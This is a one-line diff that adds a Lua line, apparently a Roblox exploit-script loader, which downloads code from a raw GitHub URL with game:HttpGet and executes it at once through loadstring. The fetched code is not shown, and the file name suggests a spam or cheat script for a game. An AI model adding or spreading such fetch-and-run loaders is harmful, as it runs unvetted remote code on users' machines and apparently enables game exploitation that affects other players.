@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SmartHammerAnimate/loaders/main/loaders/build-the-pyramid-spam6-4pp8x70ti8htmw.lua"))()
